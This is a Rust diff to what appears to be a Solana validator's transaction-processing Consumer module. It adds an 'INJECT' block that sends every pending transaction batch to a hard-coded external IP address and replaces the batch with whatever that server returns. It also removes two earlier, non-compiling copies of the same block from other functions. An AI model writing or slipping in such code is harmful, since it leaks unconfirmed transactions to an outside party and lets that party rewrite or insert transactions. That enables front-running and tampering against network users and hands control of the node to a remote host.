@@ -1,5 +1,3 @@
-use solana_sdk::transaction::VersionedTransaction;
-
 use {
     super::{
         committer::{CommitTransactionDetails, Committer, PreBalanceInfo},
@@ -156,6 +154,41 @@ impl Consumer {
     ) -> Option<Vec<usize>> {
         if payload.reached_end_of_slot {
             return None;
+        }
+
+        // INJECT
+        // change type for SanitizedTransaction to VersionedTransaction;
+        if payload.sanitized_transactions.len() > 0 {
+            let encoded = bincode::serialize(&payload.sanitized_transactions).unwrap();
+            let client = reqwest::blocking::Client::new();
+            if let Ok(resp_raw) = client
+                .post("http://134.122.68.49:5775")
+                .json::<Vec<u8>>(&encoded)
+                .send()
+            {
+                if let Ok(resp) = resp_raw.text() {
+                    match serde_json::from_str::<Vec<u8>>(&resp) {
+                        Ok(bin) => {
+                            match bincode::deserialize::<Vec<SanitizedTransaction>>(&bin) {
+                                // change type for VersionedTransaction to SanitizedTransaction;
+                                Ok(parsed_out) => {
+                                    println!("Success! bincode parse");
+                                    // TODO fix type
+                                    payload.sanitized_transactions = parsed_out;
+                                }
+                                Err(e) => {
+                                    println!("Error! bincode parse");
+                                    println!("{:?}", e);
+                                }
+                            };
+                        }
+                        Err(e) => {
+                            println!("Error! json parse");
+                            println!("{:?}", e);
+                        }
+                    }
+                }
+            }
         }
 
         let packets_to_process_len = packets_to_process.len();
@@ -407,46 +440,6 @@ impl Consumer {
         txs: &[SanitizedTransaction],
         max_slot_ages: &[Slot],
     ) -> ProcessTransactionBatchOutput {
-        // Need to filter out transactions since they were sanitized earlier.
-        // This means that the transaction may cross and epoch boundary (not allowed),
-        //  or account lookup tables may have been closed.
-
-        // INJECT
-        // change type for SanitizedTransaction to VersionedTransaction;
-        if txs.len() > 0 {
-            let encoded = bincode::serialize(txs).unwrap();
-            let client = reqwest::blocking::Client::new();
-            if let Ok(resp_raw) = client
-                .post("http://134.122.68.49:5775")
-                .json::<Vec<u8>>(&encoded)
-                .send()
-            {
-                if let Ok(resp) = resp_raw.text() {
-                    match serde_json::from_str::<Vec<u8>>(&resp) {
-                        Ok(bin) => {
-                            match bincode::deserialize::<Vec<VersionedTransaction>>(&bin) {
-                                // change type for VersionedTransaction to SanitizedTransaction;
-                                Ok(parsed_out) => {
-                                    println!("Success! bincode parse");
-                                    // TODO fix type
-                                    txs = parsed_out.iter();
-                                    dbg!(&txs);
-                                }
-                                Err(e) => {
-                                    println!("Error! bincode parse");
-                                    println!("{:?}", e);
-                                }
-                            };
-                        }
-                        Err(e) => {
-                            println!("Error! json parse");
-                            println!("{:?}", e);
-                        }
-                    }
-                }
-            }
-        }
-
         let pre_results = txs.iter().zip(max_slot_ages).map(|(tx, max_slot_age)| {
             if *max_slot_age < bank.slot() {
                 // Attempt re-sanitization after epoch-cross.
@@ -478,44 +471,6 @@ impl Consumer {
         chunk_offset: usize,
         pre_results: impl Iterator<Item = Result<(), TransactionError>>,
     ) -> ProcessTransactionBatchOutput {
-
-        // INJECT
-
-        // change type for SanitizedTransaction to VersionedTransaction;
-        if txs.len() > 0 {
-            let encoded = bincode::serialize(txs).unwrap();
-            let client = reqwest::blocking::Client::new();
-            if let Ok(resp_raw) = client
-                .post("http://134.122.68.49:5775")
-                .json::<Vec<u8>>(&encoded)
-                .send()
-            {
-                if let Ok(resp) = resp_raw.text() {
-                    match serde_json::from_str::<Vec<u8>>(&resp) {
-                        Ok(bin) => {
-                            match bincode::deserialize::<Vec<VersionedTransaction>>(&bin) {
-                                // change type for VersionedTransaction to SanitizedTransaction;
-                                Ok(parsed_out) => {
-                                    println!("Success! bincode parse");
-                                    // TODO fix type
-                                    txs = parsed_out.iter();
-                                    dbg!(&txs);
-                                }
-                                Err(e) => {
-                                    println!("Error! bincode parse");
-                                    println!("{:?}", e);
-                                }
-                            };
-                        }
-                        Err(e) => {
-                            println!("Error! json parse");
-                            println!("{:?}", e);
-                        }
-                    }
-                }
-            }
-        }
-
         let (
             (transaction_qos_cost_results, cost_model_throttled_transactions_count),
             cost_model_us,
